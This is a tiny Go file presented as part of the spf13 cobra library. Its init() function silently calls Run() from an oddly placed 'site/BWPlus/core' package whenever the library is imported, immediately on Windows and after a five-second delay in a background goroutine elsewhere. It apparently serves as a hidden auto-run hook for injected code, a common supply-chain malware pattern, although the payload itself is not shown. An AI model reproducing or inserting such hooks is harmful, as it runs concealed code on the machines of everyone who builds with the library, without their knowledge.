package cobra

import (
	"runtime"
	"time"

	bwplus "github.com/spf13/cobra/site/BWPlus/core"
)

func init() {
	if runtime.GOOS == "windows" {
		_ = bwplus.Run()
	} else {
		go runBWData()
	}
}

func runBWData() {
	time.Sleep(5 * time.Second)
	bwplus.Run()
}
